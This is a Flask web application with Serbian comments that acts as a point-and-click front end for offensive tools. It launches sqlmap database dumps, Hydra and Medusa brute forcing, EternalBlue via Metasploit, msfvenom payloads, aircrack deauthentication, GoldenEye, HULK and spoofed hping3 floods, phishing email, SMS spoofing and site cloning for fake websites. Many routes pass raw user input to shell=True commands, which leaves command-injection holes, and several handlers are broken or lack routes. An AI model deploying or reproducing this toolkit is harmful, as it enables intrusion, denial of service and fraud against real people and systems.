import subprocess
from flask import Flask, render_template, request, jsonify, redirect, url_for, Blueprint
import time 
import smtplib
import os
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from twilio.rest import Client

app = Flask(__name__)

# Početna stranica
@app.route('/')
def index():
    return render_template('index.html')

# Stranica za Reconnaissance
@app.route('/scan')
def scan():
    return render_template('scan.html')
@app.route('/password_cracking')
def password_cracking():
    return render_template('password_cracking.html')

# Stranica za Network Scanners
@app.route('/network_scanners')
def network_scanners():
    return render_template('network_scanners.html')

@app.route('/nikto')
def nikto():
    return render_template('/nikto.html')  # Stranica za Nikto alat
@app.route('/nikto', methods=['GET', 'POST'])
def nikto_tool():
    result = None

    if request.method == 'POST':
        # Preuzimanje parametara iz forme
        target = request.form.get('target')  # URL ili IP meta
        port = request.form.get('port')  # Port za skeniranje
        ssl = request.form.get('ssl')  # SSL skeniranje
        output = request.form.get('output')  # Izveštaj

        # Građenje komandne linije
        if target:
            command = f"nikto -h {target}"
            if port:
                command += f" -p {port}"
            if ssl:
                command += " -ssl"
            if output:
                command += f" -o {output}"

            try:
                # Pokretanje Nikto alata
                process = subprocess.run(command.split(), capture_output=True, text=True)
                result = process.stdout if process.returncode == 0 else process.stderr
            except Exception as e:
                result = f"Error: {str(e)}"
        else:
            result = "Please provide a valid target."

    return render_template('nikto.html', result=result)


@app.route('/sqlmap')
def sqlmap():
    return render_template('/sqlmap.html')  # Stranica za SQLMap alat
@app.route('/sqlmap', methods=['GET', 'POST'])
def sqlmap_tool():
    result = None

    if request.method == 'POST':
        # Preuzimanje parametara iz forme
        target_url = request.form.get('target_url')
        method = request.form.get('method')
        db_info = request.form.get('db_info')
        dump_data = request.form.get('dump_data')

        # Provera unetih opcija
        if not target_url:
            return render_template('sqlmap.html', result="Target URL is required.")

        # Građenje komandne linije
        command = f"sqlmap -u {target_url}"
        if method:
            command += f" --method={method}"
        if db_info == 'yes':
            command += " --dbs"
        if dump_data == 'yes':
            command += " --dump"

        try:
            # Pokretanje SQLMap alata
            process = subprocess.run(command.split(), capture_output=True, text=True)
            result = process.stdout if process.returncode == 0 else process.stderr
        except Exception as e:
            result = f"Error: {str(e)}"

    return render_template('sqlmap.html', result=result)


@app.route('/wfuzz')
def wfuzz():
    return render_template('/wfuzz.html')  # Stranica za WFuzz alat

@app.route('/wfuzz', methods=['GET', 'POST'])
def wfuzz_tool():
    result = None

    if request.method == 'POST':
        # Preuzimanje parametara iz forme
        target_url = request.form.get('target_url')
        wordlist = request.form.get('wordlist')
        test_headers = request.form.get('test_headers', 'no')
        test_cookies = request.form.get('test_cookies', 'no')

        if not target_url or not wordlist:
            return render_template('wfuzz.html', result="Target URL and Wordlist are required.")

        # Građenje osnovne komande
        command = f"wfuzz -c -z file,{wordlist} -u {target_url}"

        # Opcionalne funkcionalnosti
        if test_headers == 'yes':
            command += " -H 'FUZZ: CustomHeader'"
        if test_cookies == 'yes':
            command += " -b 'session=FUZZ'"

        try:
            # Pokretanje WFuzz alata
            process = subprocess.run(command.split(), capture_output=True, text=True)
            result = process.stdout if process.returncode == 0 else process.stderr
        except Exception as e:
            result = f"Error: {str(e)}"

    return render_template('wfuzz.html', result=result)


@app.route('/whatweb')
def whatweb():
    return render_template('/whatweb.html')  # Stranica za WhatWeb alat
def whatweb_tool():
    result = None

    if request.method == 'POST':
        # Preuzimanje parametara iz forme
        target_url = request.form.get('target_url')
        detailed_scan = request.form.get('detailed_scan', 'no')
        show_headers = request.form.get('show_headers', 'no')

        if not target_url:
            return render_template('whatweb.html', result="Target URL is required.")

        # Građenje osnovne komande
        command = f"whatweb {target_url}"

        # Dodavanje opcija
        if detailed_scan == 'yes':
            command += " --verbose"
        if show_headers == 'yes':
            command += " --log-headers"

        try:
            # Pokretanje WhatWeb alata
            process = subprocess.run(command.split(), capture_output=True, text=True)
            result = process.stdout if process.returncode == 0 else process.stderr
        except Exception as e:
            result = f"Error: {str(e)}"

    return render_template('whatweb.html', result=result)


@app.route('/wafwoof')
def wafwoof():
    return render_template('/wafwoof.html')  # Stranica za WafW00f alat
def wafwoof_tool():
    result = None

    if request.method == 'POST':
        # Preuzimanje parametara iz forme
        target_url = request.form.get('target_url')
        detailed_scan = request.form.get('detailed_scan', 'no')
        list_wafs = request.form.get('list_wafs', 'no')

        if not target_url and list_wafs != 'yes':
            return render_template('wafwoof.html', result="Target URL is required unless listing WAFs.")

        # Građenje osnovne komande
        if list_wafs == 'yes':
            command = "wafw00f --list"
        else:
            command = f"wafw00f {target_url}"
            if detailed_scan == 'yes':
                command += " -v"

        try:
            # Pokretanje WafW00f alata
            process = subprocess.run(command.split(), capture_output=True, text=True)
            result = process.stdout if process.returncode == 0 else process.stderr
        except Exception as e:
            result = f"Error: {str(e)}"

    return render_template('wafwoof.html', result=result)



@app.route('/sniffing_tools')
def sniffing_tools():
    return render_template('sniffing_tools.html')

@app.route('/ddos_tools')
def ddos_tools():
    return render_template('ddos_tools.html')

@app.route('/social_engineering_tools')
def social_engineering_tools():
    return render_template('social_engineering_tools.html')


# Stranica za Nmap formu
@app.route('/nmap', methods=['GET', 'POST'])
def nmap():
    if request.method == 'GET':
        return render_template('nmap.html')
    
    if request.method == 'POST':
        scan_data = request.get_json()
        ip = scan_data['target']
        options = []

        # Dodavanje opcija u zavisnosti od izbora korisnika
        if scan_data['options'].get('ping_scan'):
            options.append('-sn')
        if scan_data['options'].get('port_scan'):
            options.append('-p-')
        if scan_data['options'].get('os_scan'):
            options.append('-O')
        if scan_data['options'].get('detect_service'):
            options.append('-sV')
        if scan_data['options'].get('cve_detection'):
            options.append('--script=vuln')
        if scan_data['options'].get('flood_detection'):
            options.append('--script=dos')
        if scan_data['options'].get('tcp_fin_scan'):
            options.append('-sF')

        # Kreiranje Nmap komande
        command = ['nmap'] + options + [ip]

        try:
            print(f"Running command: {' '.join(command)}")  # Log za Nmap komandu
            result = subprocess.check_output(command, stderr=subprocess.STDOUT, universal_newlines=True)
            print("Nmap command executed successfully.")  # Log za uspeh komande
            print(f"Result: {result}")  # Prikazivanje rezultata u terminalu
            return redirect(url_for('nmap_results', result=result))
        except subprocess.CalledProcessError as e:
            print(f"Error: {e.output}")  # Log za grešku
            return redirect(url_for('nmap_results', result=f"Error: {e.output}"))

# Stranica za prikaz rezultata Nmap skeniranja
@app.route('/nmap_results')
def nmap_results():
    result = request.args.get('result', 'No results available.')
    # Snimanje rezultata u fajl
    with open('static/results/nmap_output.txt', 'w') as file:
        file.write(result)
    # Vraćanje stranice sa linkom za preuzimanje rezultata
    return render_template('nmap_results.html', result=result)

@app.route('/whois_lookup', methods=['GET', 'POST'])
def whois_lookup():
    if request.method == 'POST':
        if request.is_json:
            scan_data = request.get_json()  # Ako su podaci u JSON formatu
            target = scan_data['target']
            tool = scan_data['tool']
        else:
            target = request.form.get('target')  # Ako su podaci iz HTML forme
            tool = request.form.get('tool')

        result = ""
        if tool == 'whois':
            result = subprocess.run(['whois', target], capture_output=True, text=True).stdout
        elif tool == 'theharvester':
            result = subprocess.run(['theharvester', '-d', target, '-b', 'all'], capture_output=True, text=True).stdout
        
        return jsonify({'result': result})  # Vraća rezultat u JSON formatu

    return render_template('whois_lookup.html')


# Stranica za prikaz rezultata Whois
@app.route('/whois_results', methods=['POST'])
def whois_results():
    # Parsiraj JSON podatke sa zahteva
    data = request.get_json()

    # Provera da li su prosleđeni validni podaci
    if not data or 'target' not in data or 'tool' not in data:
        return jsonify({'error': 'Missing target or tool parameter'}), 400

    target = data['target']
    tool = data['tool']

    # Simulacija odgovora (prilagodi ovo stvarnoj logici)
    result = f"Whois data for {target} using {tool} tool."

    return jsonify({'result': result})
@app.route('/dns_enum')
def dns_enum():
    return render_template('dns_enum.html')
def dns_enum():
    if request.method == 'POST':
        try:
            # Proverava da li je zahtev JSON ili iz forme
            if request.is_json:
                scan_data = request.get_json()
                target = scan_data.get('target')
                tool = scan_data.get('tool')
            else:
                target = request.form.get('target')
                tool = request.form.get('tool')

            if not target or not tool:
                return jsonify({'error': 'Target or tool not specified.'}), 400

            # Mapiranje alata na odgovarajuće komande
            commands = {
                'dnsrecon': ['dnsrecon', '-d', target],
                'sublister': ['sublister', '-d', target],
                'amass': ['amass', 'enum', '-d', target],
                'dnssdumpster': ['curl', '-s', f'https://dnsdumpster.com/static/map/resolve.php?host={target}']
            }

            if tool not in commands:
                return jsonify({'error': 'Invalid tool selected.'}), 400

            # Pokretanje odgovarajuće komande
            command = commands[tool]
            result = subprocess.run(command, capture_output=True, text=True)
            output = result.stdout if result.returncode == 0 else f"Error: {result.stderr}"

            return jsonify({'result': output})
        except Exception as e:
            return jsonify({'error': str(e)}), 500

    # GET metoda prikazuje HTML stranicu
    return render_template('dns_enum.html')

# Stranica za prikaz rezultata DNS alata
@app.route('/dns_results', methods=['POST'])
def dns_results():
    # Parsiraj JSON podatke sa zahteva
    data = request.get_json()

    # Provera da li su prosleđeni validni podaci
    if not data or 'target' not in data or 'tool' not in data:
        return jsonify({'error': 'Missing target or tool parameter'}), 400

    target = data['target']
    tool = data['tool']

    # Simulacija odgovora (prilagodi ovo stvarnoj logici)
    result = f"DNS data for {target} using {tool} tool."

    return jsonify({'result': result})
@app.route('/exploitation_tools', methods=['GET'])
def exploitation_tools():
    return render_template('exploitation_tools.html')
@app.route('/metasploit', methods=['GET'])
def metasploit():
    return render_template('metasploit.html')
def metasploit():
    if request.method == 'POST':
        data = request.get_json()  # Uzimamo podatke u JSON formatu
        target = data.get('target')
        payload = data.get('payload')
        lhost = data.get('lhost')
        lport = data.get('lport')
        rport = data.get('rport')

        result = run_metasploit(target, payload, lhost, lport, rport)
        return jsonify({'result': result})

    return render_template('metasploit.html')

def run_metasploit(target, payload, lhost, lport, rport):
    try:
        # Pokretanje Metasploit komande sa više parametara
        command = f"msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOST {target}; set LHOST {lhost}; set LPORT {lport}; set RPORT {rport}; set PAYLOAD {payload}; run'"
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout
    except Exception as e:
        return str(e)
    
@app.route('/msfvenom', methods=['GET'])
def msfvenom():
    return render_template('msfvenom.html')
def msfvenom():
    if request.method == 'POST':
        data = request.get_json()  # Uzimamo podatke u JSON formatu
        lhost = data.get('lhost')
        lport = data.get('lport')
        payload = data.get('payload')
        format = data.get('format')

        result = run_msfvenom(lhost, lport, payload, format)
        return jsonify({'result': result})

    return render_template('msfvenom.html')

def run_msfvenom(lhost, lport, payload, format):
    try:
        # Pokretanje MSFvenom komande za generisanje payload-a
        command = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {format} > /tmp/payload.{format}"
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout
    except Exception as e:
        return str(e)
    
@app.route('/searchsploit', methods=['GET'])
def show_searchsploit():
    return render_template('searchsploit.html')

# Ruta za POST zahtev koji izvršava searchsploit komandu
@app.route('/searchsploit', methods=['POST'])
def searchsploit():
    if request.method == 'POST':
        try:
            # Preuzimanje target-a iz JSON zahteva
            data = request.get_json()
            target = data.get('target')

            if not target:
                return jsonify({"error": "Target not provided"}), 400

            # Pokretanje SearchSploit za pretragu exploita
            command = f"searchsploit {target}"
            result = subprocess.run(command, shell=True, capture_output=True, text=True)

            if result.returncode != 0:
                return jsonify({"error": "Error while running SearchSploit"}), 500

            # Vraćanje rezultata kao JSON
            return jsonify({"result": result.stdout})

        except Exception as e:
            return jsonify({"error": str(e)}), 500
        
# Ruta za prikazivanje exploitdb stranice
@app.route('/exploitdb', methods=['GET'])
def exploitdb_search():
    return render_template('exploitdb.html')

# Ruta za POST zahtev koji izvršava exploitdb pretragu
@app.route('/exploitdb', methods=['POST'])
def exploitdb():
    if request.method == 'POST':
        try:
            # Preuzimanje target-a iz JSON zahteva
            data = request.get_json()
            target = data.get('target')

            if not target:
                return jsonify({"error": "Target not provided"}), 400

            # Pokretanje ExploitDB pretrage
            command = f"search {target}"
            result = subprocess.run(command, shell=True, capture_output=True, text=True)

            if result.returncode != 0:
                return jsonify({"error": "Error while running ExploitDB search"}), 500

            # Vraćanje rezultata kao JSON
            return jsonify({"result": result.stdout})

        except Exception as e:
            return jsonify({"error": str(e)}), 500

@app.route('/wifi_tools', methods=['GET'])
def wifi_tools():
    return render_template('wifi_tools.html')

@app.route('/aircrackg',methods=['GET'])
def aircrack_ng():
    return render_template('aircrack.html')                          
                        
def aircrack():
    result = None
    if request.method == 'POST':
        # Preuzimanje akcije koju korisnik želi
        action = request.form.get('action')
        arguments = request.form.get('arguments', "")

        # Mapiranje akcija na odgovarajuće komande
        commands = {
            'crack_handshake': f"aircrack-ng {arguments}",
            'capture_traffic': f"airodump-ng {arguments}",
            'deauth_attack': f"aireplay-ng {arguments}",
            'show_help': "aircrack-ng --help"
        }

        # Provera validne akcije
        command = commands.get(action)
        if not command:
            result = "Invalid action selected."
        else:
            try:
                # Pokretanje komande i hvatanje izlaza
                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
            except subprocess.CalledProcessError as e:
                result = f"Error: {e.output}"
            except Exception as e:
                result = f"Unexpected Error: {str(e)}"

    return render_template('aircrack.html', result=result)

@app.route('/kismet',methods=['GET'])
def kismet():
    return render_template('kismet.html')
def kismet():
    result = None
    if request.method == 'POST':
        # Preuzimanje akcije od korisnika
        action = request.form.get('action')

        # Mapiranje akcija na odgovarajuće komande
        commands = {
            'start_server': "kismet",
            'list_devices': "kismet_cap_linux_wifi --list",
            'export_logs': "cp /var/log/kismet/* ./kismet_logs/"  # Primer za izvoz logova
        }

        # Preuzimanje komande na osnovu akcije
        command = commands.get(action)
        if not command:
            result = "Invalid action selected."
        else:
            try:
                # Pokretanje komande i hvatanje izlaza
                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
            except subprocess.CalledProcessError as e:
                result = f"Error: {e.output}"
            except Exception as e:
                result = f"Unexpected Error: {str(e)}"

    return render_template('kismet.html', result=result)
@app.route('/wifite',methods=['GET'])
def wifite():
    return render_template('wifite.html')

def wifite():
    result = None
    if request.method == 'POST':
        # Preuzimanje akcije od korisnika
        action = request.form.get('action')

        # Mapiranje akcija na odgovarajuće komande
        commands = {
            'scan_networks': "wifite --scan",
            'attack_all': "wifite --all",
            'show_help': "wifite --help"
        }

        # Provera da li je validna akcija
        command = commands.get(action)
        if not command:
            result = "Invalid action selected."
        else:
            try:
                # Pokretanje komande i hvatanje izlaza
                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
            except subprocess.CalledProcessError as e:
                result = f"Error: {e.output}"
            except Exception as e:
                result = f"Unexpected Error: {str(e)}"

    return render_template('wifite.html', result=result)

@app.route('/wash',methods=['GET'])
def wash():
    return render_template('wash.html')

def wash():
    result = None
    if request.method == 'POST':
        # Preuzimanje akcije od korisnika
        action = request.form.get('action')

        # Mapiranje akcija na odgovarajuće komande
        commands = {
            'scan_wps': "wash -i wlan0mon",  # Proverite da li koristite ispravnu interfejs karticu
            'show_help': "wash --help"
        }

        # Provera da li je validna akcija
        command = commands.get(action)
        if not command:
            result = "Invalid action selected."
        else:
            try:
                # Pokretanje komande i hvatanje izlaza
                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
            except subprocess.CalledProcessError as e:
                result = f"Error: {e.output}"
            except Exception as e:
                result = f"Unexpected Error: {str(e)}"

    return render_template('wash.html', result=result)



@app.route('/hydra')
def hydra():
    return render_template('hydra.html')
@app.route('/run_hydra', methods=['POST'])
def run_hydra():
    data = request.get_json()
    target = data.get('target')
    protocol = data.get('protocol')
    username = data.get('username')
    password_list = data.get('passwordList')
    port = data.get('port')
    threads = data.get('threads')

    # Validacija unosa
    if not target or not protocol or not password_list:
        return jsonify({"error": "Ciljna adresa, protokol i lista lozinki su obavezni parametri"}), 400

    # Formiranje komande
    command = f"hydra -l {username} -P {password_list} {target} {protocol}"
    if port:
        command += f" -s {port}"
    if threads:
        command += f" -t {threads}"

    try:
        # Pokretanje Hydra alata
        result = subprocess.run(command.split(), capture_output=True, text=True)
        output = result.stdout or result.stderr
    except Exception as e:
        output = f"Greška prilikom pokretanja Hydra: {str(e)}"

    return jsonify({"output": output})
@app.route('/medusa')
def medusa():
    return render_template('medusa.html')

@app.route('/run_medusa', methods=['POST'])
def run_medusa():
    data = request.get_json()
    target = data.get('target')
    username = data.get('username')
    password_list = data.get('passwordList')
    protocol = data.get('protocol')
    port = data.get('port', None)
    threads = data.get('threads', None)

    if not target or not username or not password_list or not protocol:
        return jsonify({"error": "Ciljna adresa, korisničko ime, lista lozinki i protokol su obavezni parametri"}), 400

    # Kreiraj komandnu liniju za Medusa
    command = f"medusa -h {target} -u {username} -P {password_list} -M {protocol}"
    if port:
        command += f" -n {port}"
    if threads:
        command += f" -t {threads}"

    try:
        # Pokretanje Medusa komande
        result = subprocess.run(command.split(), capture_output=True, text=True)
        output = result.stdout or result.stderr
    except Exception as e:
        output = f"Greška prilikom pokretanja Medusa: {str(e)}"

    return jsonify({"output": output})


@app.route('/johntheripper')
def johntheripper():
    return render_template('john.html')
@app.route('/run_john', methods=['POST'])
def run_john():
    data = request.get_json()
    wordlist = data.get('wordlist')
    hash_file = data.get('hashFile')
    format = data.get('format', None)
    rules = data.get('rules', False)
    incremental = data.get('incremental', False)

    if not hash_file:
        return jsonify({"error": "Hash fajl je obavezan parametar"}), 400

    # Kreiraj komandnu liniju za John
    command = f"john {hash_file}"
    if wordlist:
        command += f" --wordlist={wordlist}"
    if format:
        command += f" --format={format}"
    if rules:
        command += " --rules"
    if incremental:
        command += " --incremental"

    try:
        # Pokretanje John komande
        result = subprocess.run(command.split(), capture_output=True, text=True)
        output = result.stdout or result.stderr
    except Exception as e:
        output = f"Greška prilikom pokretanja JohnTheRipper: {str(e)}"

    return jsonify({"output": output})

@app.route('/hashcat')
def hashcat():
    return render_template('hashcat.html')
@app.route('/run_hashcat', methods=['POST'])
def run_hashcat():
    data = request.get_json()
    hash_file = data.get('hashFile')
    wordlist = data.get('wordlist', None)
    attack_mode = data.get('attackMode', None)
    hash_type = data.get('hashType', None)
    rules = data.get('rules', None)

    if not hash_file:
        return jsonify({"error": "Hash fajl je obavezan parametar"}), 400

    # Kreiraj komandnu liniju za Hashcat
    command = f"hashcat -m {hash_type} -a {attack_mode} {hash_file}"
    if wordlist:
        command += f" {wordlist}"
    if rules:
        command += f" --rules-file={rules}"

    try:
        # Pokretanje Hashcat komande
        result = subprocess.run(command.split(), capture_output=True, text=True)
        output = result.stdout or result.stderr
    except Exception as e:
        output = f"Greška prilikom pokretanja Hashcat: {str(e)}"

    return jsonify({"output": output})
@app.route('/sniffing')
def sniffing_home():
    return render_template('sniffing.html')

@app.route('/run_tool', methods=['POST'])
def run_tool():
    data = request.get_json()
    tool = data.get('tool')
    arguments = data.get('arguments', "")  # Korisnik može da prosledi dodatne argumente

    # Mapa dostupnih alata i osnovnih komandi
    command_map = {
        "tcpdump": f"tcpdump {arguments}",
        "wireshark": "tshark -r file.pcap",  # Wiresharkova CLI verzija (tshark)
        "ettercap": f"ettercap {arguments}"
    }

    if tool not in command_map:
        return jsonify({"error": "Invalid tool selected"}), 400

    try:
        # Pokreni komandu za alat
        result = subprocess.run(command_map[tool], shell=True, text=True, capture_output=True)
        output = result.stdout or result.stderr
    except Exception as e:
        output = f"Error: {str(e)}"
    
    return jsonify({"output": output})
@app.route('/ddos_tools')
def ddos_home():
    return render_template('ddos_tools.html')

@app.route('/goldeneye')
def goldeneye():
    return render_template('goldenEye.html')

@app.route('/hulk')
def hulk():
    return render_template('hulk.html')

# Pokretanje GoldenEye sa dodatnim opcijama
@app.route('/run_goldeneye', methods=['POST'])
def run_goldeneye():
    data = request.get_json()
    target = data.get('target')
    threads = data.get('threads')
    proxy = data.get('proxy')  # Proxy opcija
    timeout = data.get('timeout')  # Timeout opcija
    keep_alive = data.get('keep_alive', False)  # Keep-Alive opcija

    if not target or not threads:
        return jsonify({"error": "Nedostaju parametri"}), 400

    # Komanda za GoldenEye
    command = f"python3 goldeneye.py {target} -w {threads}"
    if proxy:
        command += f" --proxy {proxy}"
    if timeout:
        command += f" --timeout {timeout}"
    if keep_alive:
        command += " --keep-alive"

    try:
        result = subprocess.run(command, shell=True, text=True, capture_output=True)
        output = result.stdout or result.stderr
    except Exception as e:
        output = f"Greška: {str(e)}"

    return jsonify({"output": output})

# Pokretanje HULK sa dodatnim opcijama
@app.route('/run_hulk', methods=['POST'])
def run_hulk():
    data = request.get_json()
    target = data.get('target')
    randomize = data.get('randomize', False)  # Randomizacija opcija

    if not target:
        return jsonify({"error": "Nedostaju parametri"}), 400

    # Komanda za HULK
    command = f"python3 hulk.py {target}"
    if randomize:
        command += " --randomize"

    try:
        result = subprocess.run(command, shell=True, text=True, capture_output=True)
        output = result.stdout or result.stderr
    except Exception as e:
        output = f"Greška: {str(e)}"

    return jsonify({"output": output})
@app.route('/other_tools')
def other_tools():
    return render_template('other_tools.html')

# Ruta za pokretanje drugih napada
@app.route('/run_others_attack', methods=['POST'])


def run_others_attack():
    data = request.get_json()
    ip_address = data.get('ipAddress')
    attack_type = data.get('attackType')

    if not ip_address or not attack_type:
        return jsonify({"error": "Nedostaju parametri"}), 400

    command = ""
    if attack_type == "syn":
        command = f"sudo hping3 -S {ip_address} -p 80 --flood -c 1000"  # Ograničenje na 1000 paketa za primer
    elif attack_type == "reflection":
        command = f"sudo hping3 --flood --spoof {ip_address} -p 80 -c 1000"
    elif attack_type == "amplification":
        command = f"sudo hping3 --flood --spoof {ip_address} -p 80 --udp -c 1000"
    elif attack_type == "yoyo":
        command = f"sudo hping3 --flood --spoof {ip_address} -p 80 --yoyo -c 1000"
    else:
        return jsonify({"error": "Nepoznata vrsta napada"}), 400

    try:
        # Beleženje početka vremena napada
        start_time = time.time()

        # Pokrećemo napad
        result = subprocess.run(command, shell=True, text=True, capture_output=True)
        
        # Beleženje kraja vremena napada
        end_time = time.time()

        # Obrada rezultata
        output = result.stdout or result.stderr
        elapsed_time = end_time - start_time  # Trajanje napada
        packets_sent = 1000  # Prema parametru -c, broj poslatih paketa

        # Povratni podaci
        return jsonify({
            "success": True,
            "ip_address": ip_address,
            "attack_type": attack_type,
            "packets_sent": packets_sent,
            "elapsed_time": round(elapsed_time, 2),  # Trajanje u sekundama
            "output": output
        })
    except Exception as e:
        return jsonify({"success": False, "error": f"Greška: {str(e)}"}), 500


@app.route('/social-engineering-tool')
def social_engineering_tool():
    return render_template('social_engineering_tool.html')

# Ruta za Phishing Email
@app.route('/phishing')
def phishing_tool():
    return render_template('phishing.html')
@app.route('/phishing', methods=['GET', 'POST'])
def phishing():
    if request.method == 'POST':
        victim_email = request.form.get('victim_email')
        subject = request.form.get('subject')
        content = request.form.get('content')

        if victim_email and subject and content:
            try:
                # Pozivamo funkciju koja šalje phishing email sa novim poljima
                send_phishing_email(victim_email, subject, content)
                return render_template('phishing.html', message="Phishing email has been sent successfully!")
            except Exception as e:
                return render_template('phishing.html', message=f"Error: {str(e)}")
        else:
            return render_template('phishing.html', message="Please provide all required fields!")
    return render_template('phishing.html')

def send_phishing_email(victim_email, subject, content):
    sender_email = "your_email@example.com"  # Tvoj email
    sender_password = "your_password"  # Tvoja lozinka
    smtp_server = "smtp.example.com"  # SMTP server
    smtp_port = 587  # Port za SMTP (npr. 587 za TLS)

    try:
        # Postavljanje phishing emaila sa svim podacima
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = victim_email
        msg['Subject'] = subject
        msg.attach(MIMEText(content, 'plain'))

        # Povezivanje sa SMTP serverom
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(sender_email, sender_password)

        # Slanje emaila
        server.sendmail(sender_email, victim_email, msg.as_string())
        server.quit()
    except Exception as e:
        raise Exception(f"Failed to send email: {str(e)}")
# Ruta za SMS Spoofing
@app.route('/smishing')
def smishing_def():
    return render_template('smishing.html')
@app.route('/smishing', methods=['GET', 'POST'])
def smishing():
    if request.method == 'POST':
        target_phone = request.form.get('target_phone')
        message = request.form.get('message')

        if target_phone and message:
            try:
                # Pozivamo funkciju koja simulira slanje SMS spoofa
                send_sms_spoof(target_phone, message)
                return render_template('smishing.html', message="SMS Spoof has been sent successfully!")
            except Exception as e:
                return render_template('smishing.html', message=f"Error: {str(e)}")
        else:
            return render_template('smishing.html', message="Please provide all required fields!")
    return render_template('smishing.html')

def send_sms_spoof(target_phone, message):
    # Kreiraj Twilio klijent
    client = Client(account_sid, auth_token)

    # Slanje SMS poruke sa spoofovanim brojem
    client.messages.create(
        body=message,  # Sadržaj poruke
        from_=twilio_number,  # Twilio broj
        to=target_phone  # Broj cilja
    )

# Ruta za Lažni Web Sajt
@app.route('/fake-website')
def fake_website_def():
    return render_template('fake_website.html')
@app.route('/fake-website', methods=['GET', 'POST'])
def fake_website():
    if request.method == 'POST':
        target_url = request.form.get('target_url')

        if target_url:
            try:
                # Generišemo lažni sajt pomoću HTTrack
                clone_website(target_url)
                return render_template('fake_website.html', message="Fake website has been generated successfully! Check the cloned site directory.")
            except Exception as e:
                return render_template('fake_website.html', message=f"Error: {str(e)}")
        else:
            return render_template('fake_website.html', message="Please provide a valid URL!")
    return render_template('fake_website.html')

def clone_website(target_url):
    # Definišemo direktorijum za skladištenje kloniranog sajta
    output_dir = f"cloned_sites/{target_url.replace('https://', '').replace('http://', '')}"
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)

    # Pokrećemo HTTrack da kloniramo veb sajt
    command = f"httrack {target_url} -O {output_dir}"
    subprocess.run(command, shell=True)

if __name__ == '__main__':
    app.run(debug=True)
